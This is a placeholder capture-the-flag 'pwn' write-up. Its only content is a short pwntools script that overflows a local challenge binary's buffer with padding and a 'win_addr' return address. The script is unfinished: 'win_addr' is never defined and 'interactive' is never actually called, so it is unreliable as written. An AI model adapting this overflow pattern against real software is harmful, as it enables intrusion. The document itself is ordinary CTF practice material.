---
layout: default
title: "placeholder challenge write-up"
category: "pwn - hard"
---

# what is this about?

## Analysis

solve script:

```
from pwn import *

elf = ELF('./challenge')
io = process(elf.path)

io.sendlineafter(b'> ', b'1')

payload = flat(
  b'A' * 40,
  b'B' * 8,
  win_addr
)

io.send(payload)
io.interactive
```
